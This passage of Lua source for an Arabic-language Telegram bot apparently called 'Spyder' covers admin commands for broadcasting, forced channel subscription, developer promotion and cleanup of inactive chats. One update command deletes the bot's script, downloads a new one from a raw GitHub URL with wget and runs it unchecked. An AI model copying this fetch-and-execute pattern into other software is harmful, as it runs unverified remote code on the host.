if msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '⌔︙ العضو ↫ '..Name..'\n⌔︙ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end      
if msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1, nil,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '⌔︙ العضو ↫ '..Name..'\n⌔︙ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '⌔︙ العضو ↫ '..Name..'\n⌔︙ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '⌔︙ العضو ↫ '..Name..'\n⌔︙ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
end,nil)
end,nil)
end,nil)
end,nil)
end 
-----------------
if text and redis:get('Spyder:'..bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء ✖' then   
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء حفظ كليشه ستارت") 
redis:del('Spyder:'..bot_id..'Start:Bots') 
return false
end
redis:set('Spyder:'..bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,'⌔︙ تم حفظ كليشه ستارت') 
redis:del('Spyder:'..bot_id..'Start:Bots') 
return false
end
if text == 'ضع كليشه ستارت 🔖' and Sudo_id(msg) then 
redis:set('Spyder:'..bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,'⌔︙ارسل لي الكليشه الان') 
return false
end
if text == 'حذف كليشه ستارت 🚫' and Sudo_id(msg) then 
redis:del('Spyder:'..bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,'⌔︙تم حذف كليشه ستارت') 
end
if text == "تغير رساله الاشتراك 🔆" and Sudo_id(msg) then  
redis:setex('Spyder:'..bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '⌔︙ حسنآ ارسل لي النص الذي تريده') 
return false  
end
if text == "حذف رساله الاشتراك 📃" and Sudo_id(msg) then  
redis:del('Spyder:'..bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, "⌔︙ تم مسح رساله الاشتراك ") 
return false  
end
----------------------------------------------------------------------------
if text == 'تفعيل التواصل 🔛' and Sudo_id(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙ تم تفعيل التواصل')
redis:del('Spyder:'..bot_id..'Twal:Bot')
end
if text == 'تعطيل التواصل ✖' and Sudo_id(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙ تم تعطيل التواصل')
redis:set('Spyder:'..bot_id..'Twal:Bot', true)
end
----------------------------------------------------------------------------
if text == 'تفعيل الوضع الخدمي 🔓' and Sudo_id(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙ تم تفعيل الوضع الخدمي')
redis:del('Spyder:'..bot_id..'lock:Free')
end
if text == 'تعطيل الوضع الخدمي 🔏' and Sudo_id(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙ تم تعطيل الوضع الخدمي')
redis:set('Spyder:'..bot_id..'lock:Free', true)
end
----------------------------------------------------------------------------
if text == 'تحديث السورس ™' and Sudo_id(msg) then 
os.execute('rm -rf Spyder.lua')
os.execute('wget https://raw.githubusercontent.com/DevSpyder/Spyder/master/Spyder.lua')
send(msg.chat_id_, msg.id_,'⌔︙ تم تحديث السورس') 
dofile('Spyder.lua')  
end
if text == "ضع اسم للبوت ©" and Sudo_id(msg) then  
redis:setex('Spyder:'..bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"⌔︙ ارسل لي الاسم الان ")  
return false
end
if text == 'الاحصائيات 📈' and Sudo_id(msg) then 
local Groups = redis:scard('Spyder:'..bot_id..'Groups_Users')  
local Users = redis:scard('Spyder:'..bot_id..'Users:ids')  
Text = '⌔︙ الاحصائيات : \n'..'⌔︙ عدد المجموعات المفعله : {'..Groups..'}'..'\n⌔︙ عدد المشتركين في البوت : {'..Users..'}'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == ("المطورين 🕹") and Sudo_id(msg) then
local list = redis:smembers('Spyder:'..bot_id..'Set:Sudo_bot')
t = "\n⌔︙ قائمة مطورين البوت \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("قائمه العام 📃") and Sudo_id(msg) then
local list = redis:smembers('Spyder:'..bot_id..'GBan:User')
t = "\n⌔︙قائمة المحظورين عام \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = redis:get('Spyder:'..bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⌔︙ لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text=="اذاعه للمشتركين 👤" and msg.reply_to_message_id_ == 0 and Sudo_id(msg) then 
redis:setex('Spyder:'..bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔︙ارسل لي سواء >> { ملصق, متحركه, صوره, رساله }\n⌔︙ للخروج ارسل الغاء ") 
return false
end 
if text=="اذاعه للمجموعات 👥" and msg.reply_to_message_id_ == 0 and Sudo_id(msg) then 
redis:setex('Spyder:'..bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔︙ارسل لي سواء >> { ملصق, متحركه, صوره, رساله }\n⌔︙ للخروج ارسل الغاء ") 
return false
end  
if text=="اذاعه بالتثبيت 📌" and msg.reply_to_message_id_ == 0 and Sudo_bot(msg) then 
if redis:get('Spyder:'..bot_id.."Public:radio") and not Sudo_id(msg) then 
send(msg.chat_id_, msg.id_,"⌔︙تم تعطيل الاذاعه من قبل المطور الاساسي !")
return false 
end
redis:setex('Spyder:'..bot_id.."Send:Bc:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔︙ارسل لي المنشور الان\n〽︙يمكنك ارسال -{ صوره - ملصق - متحركه - رساله }\n⚠︙لالغاء الاذاعه ارسل : الغاء") 
return false
end
if text=="اذاعه بالتوجيه للمجموعات ↪" and msg.reply_to_message_id_ == 0  and Sudo_id(msg) then 
redis:setex('Spyder:'..bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔︙ ارسل لي التوجيه الان") 
return false
end 
if text=="اذاعه بالتوجيه للمشتركين 👤" and msg.reply_to_message_id_ == 0  and Sudo_id(msg) then 
redis:setex('Spyder:'..bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"⌔︙ ارسل لي التوجيه الان") 
return false
end
if text == 'نسخه احتياطيه 💾' and Sudo_id(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين 👥" and Sudo_id(msg) then
local pv = redis:smembers('Spyder:'..bot_id..'Users:ids')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
redis:srem('Spyder:'..bot_id..'Users:ids',pv[i])  
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'⌔︙لا يوجد مشتركين وهميين')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'⌔︙عدد المشتركين الان ↫{ '..#pv..' }\n⌔︙تم العثور على ↫{ '..sendok..' } مشترك قام بحظر البوت\n⌔︙اصبح عدد المشتركين الان ↫{ '..ok..' } مشترك')   
end
end
end,nil)
end,nil)
end
return false
end
----------------------------------------------------------------------------
if text == "تنظيف المجموعات 🗑" and Sudo_id(msg) then
local group = redis:smembers('Spyder:'..bot_id..'Groups_Users')  
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
redis:srem('Spyder:'..bot_id..'Groups_Users',group[i])  
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
redis:srem('Spyder:'..bot_id..'Groups_Users',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
redis:srem('Spyder:'..bot_id..'Groups_Users',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
redis:srem('Spyder:'..bot_id..'Groups_Users',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'⌔︙لا توجد مجموعات وهميه ')   
else
local zain = (w + q)
local sendok = #group - zain
if q == 0 then
zain = ''
else
zain = '\n⌔︙ تم ازالة ~ '..q..' مجموعات من البوت'
end
if w == 0 then
Spyder = ''
else
Spyder = '\n⌔︙ تم ازالة ~'..w..' مجموعه لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'⌔︙ عدد المجموعات الان ↫ { '..#group..' } مجموعه '..Spyder..''..zain..'\n⌔︙اصبح عدد المجموعات الان ↫ { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
return false
end

if text and text:match("^تعين قناة الاشتراك 🎯$") and Sudo_id(msg) then  
redis:setex('Spyder:'..bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, '⌔︙ حسنآ ارسل لي معرف القناة') 
return false  
end
if text == "تفعيل الاشتراك الاجباري 🔭" and Sudo_id(msg) then  
if redis:get('Spyder:'..bot_id..'add:ch:id') then
local addchusername = redis:get('Spyder:'..bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_,"⌔︙ الاشتراك الاجباري مفعل \n⌔︙قناة الاشتراك ↫ ["..addchusername.."]") 
else
redis:setex('Spyder:'..bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_,"⌔︙ لم يتم وضع القناة \n⌔︙لتعين قناة الاشتراك \n⌔︙ارسل معرف القناة") 
end
return false  
end
if text == "تعطيل الاشتراك الاجباري 🚫" and Sudo_id(msg) then  
redis:del('Spyder:'..bot_id..'add:ch:id')
redis:del('Spyder:'..bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "⌔︙ تم تعطيل الاشتراك الاجباري ") 
return false  
end
if text == "الاشتراك الاجباري 📡" and Sudo_id(msg) then  
if redis:get('Spyder:'..bot_id..'add:ch:username') then
local addchusername = redis:get('Spyder:'..bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, "⌔︙ تم تفعيل الاشتراك الاجباري \n⌔︙قناة الاشتراك ↫ ["..addchusername.."]") 
else
send(msg.chat_id_, msg.id_, "⌔︙ لا يوجد قناة في الاشتراك الاجباري ") 
end
return false  
end
----------------------------------------------------------------------------
if text and text:match("^رفع مطور @(.*)$") and Sudo_id(msg) then
local username = text:match("^رفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatconfig") then
send(msg.chat_id_,msg.id_,"⌔︙ عذرا عزيزي العضو هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
redis:sadd('Spyder:'..bot_id..'Set:Sudo_bot', result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته مطور في البوت'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and Sudo_id(msg) then
local userid = text:match("^رفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:sadd('Spyder:'..bot_id..'Set:Sudo_bot', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم ترقيته مطور في البوت'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم ترقيته مطور في البوت'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and Sudo_id(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
redis:srem('Spyder:'..bot_id..'Set:Sudo_bot', result.id_)
usertext = '\n⌔︙العضو ↫ ['..result.title_..'](t.me/'..(username or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المطورين'
texts = usertext..status
else
texts = '⌔︙ لا يوجد حساب بهذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and Sudo_id(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:srem('Spyder:'..bot_id..'Set:Sudo_bot', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⌔︙العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or 'Spyder')..')'
status  = '\n⌔︙ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⌔︙العضو ↫ '..userid..''
status  = '\n⌔︙ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
end
if redis:get('Spyder:'..bot_id.."Send:Bc:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
print(text)
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n⌔︙تم الغاء الاذاعه للمجموعات") 
redis:del('Spyder:'..bot_id.."Send:Bc:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers('Spyder:'..bot_id.."Groups_Users") 
send(msg.chat_id_, msg.id_,"⌔︙تمت الاذاعه الى *- "..#list.." * مجموعه بالتثبيت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
redis:set('Spyder:'..bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
redis:set('Spyder:'..bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
redis:set('Spyder:'..bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
redis:set('Spyder:'..bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
redis:del('Spyder:'..bot_id.."Send:Bc:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
if redis:get('Spyder:'..bot_id..'Set:Name:Bot'..msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✖' then   
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء حفظ اسم البوت") 
redis:del('Spyder:'..bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
redis:del('Spyder:'..bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
redis:set('Spyder:'..bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, "⌔︙ تم حفظ اسم البوت")  
return false
end 
if text and redis:get('Spyder:'..bot_id.."Set:Za:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
redis:set('Spyder:'..bot_id.."Set:Za:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"⌔︙ارسل الامر الجديد")  
redis:del('Spyder:'..bot_id.."Set:Za:Group"..msg.chat_id_..":"..msg.sender_user_id_)
redis:set('Spyder:'..bot_id.."Set:Za:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and redis:get('Spyder:'..bot_id.."Set:Za:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = redis:get('Spyder:'..bot_id.."Set:Za:Group:New"..msg.chat_id_)
redis:set('Spyder:'..bot_id.."Set:Za:Group:New1"..msg.chat_id_..":"..text,NewCmd)
redis:sadd('Spyder:'..bot_id.."List:ZaYon:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"⌔︙تم حفظ الامر")  
redis:del('Spyder:'..bot_id.."Set:Za:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if redis:get('Spyder:'..bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✖' then   
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء الاذاعه للخاص") 
redis:del('Spyder:'..bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers('Spyder:'..bot_id..'Users:ids') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_,"⌔︙ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")     
redis:del('Spyder:'..bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if redis:get('Spyder:'..bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✖' then   
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء الاذاعه") 
redis:del('Spyder:'..bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers('Spyder:'..bot_id..'Groups_Users') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_,"⌔︙ تمت الاذاعه الى >>{"..#list.."} مجموعه في البوت ")     
redis:del('Spyder:'..bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if redis:get('Spyder:'..bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✖' then   
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء الاذاعه") 
redis:del('Spyder:'..bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = redis:smembers('Spyder:'..bot_id..'Groups_Users')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_,"⌔︙ تمت الاذاعه الى >>{"..#list.."} مجموعات في البوت ")     
redis:del('Spyder:'..bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if redis:get('Spyder:'..bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == 'الغاء ✖' then   
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء الاذاعه") 
redis:del('Spyder:'..bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = redis:smembers('Spyder:'..bot_id..'Users:ids')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_,"⌔︙ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")     
redis:del('Spyder:'..bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if redis:get('Spyder:'..bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "⌔︙ تم الغاء الامر ") 
redis:del('Spyder:'..bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
redis:del('Spyder:'..bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local username = string.match(text, "@[%a%d_]+") 
tdcli_function ({    
ID = "SearchPublicChat",    
username_ = username  
},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '⌔︙ المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatconfig' then
send(msg.chat_id_, msg.id_, '⌔︙ عذا لا يمكنك وضع معرف حسابات في الاشتراك ') 
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'⌔︙ عذا لا يمكنك وضع معرف مجوعه في الاشتراك ') 
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'⌔︙ البوت ادمن في القناة \n⌔︙ تم تفعيل الاشتراك الاجباري في \n⌔︙ ايدي القناة ('..data.id_..')\n⌔︙ معرف القناة ([@'..data.type_.channel_.username_..'])') 
redis:set('Spyder:'..bot_id..'add:ch:id',data.id_)
redis:set('Spyder:'..bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,'⌔︙ البوت ليس ادمن في القناة يرجى ترقيته ادمن ثم اعادة المحاوله ') 
end
return false  
end
end,nil)
end
if redis:get('Spyder:'..bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "⌔︙ تم الغاء الامر ") 
redis:del('Spyder:'..bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
redis:del('Spyder:'..bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
redis:set('Spyder:'..bot_id..'text:ch:user',texxt)
send(msg.chat_id_, msg.id_,'⌔︙ تم تغيير رسالة الاشتراك بنجاح ')
end
if redis:get('Spyder:'..bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_, msg.id_,"⌔︙تم الغاء الاذاعه") 
redis:del('Spyder:'..bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers('Spyder:'..bot_id.."Groups_Users") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
redis:set('Spyder:'..bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
redis:set('Spyder:'..bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
redis:set('Spyder:'..bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
redis:set('Spyder:'..bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_,"⌔︙تمت الاذاعه الى *~ "..#list.." ~* مجموعه ")     
redis:del('Spyder:'..bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
local status_welcome = redis:get('Spyder:'..bot_id..'Chek:Welcome'..msg.chat_id_)
if status_welcome and not redis:get('Spyder:'..bot_id..'lock:tagservr'..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
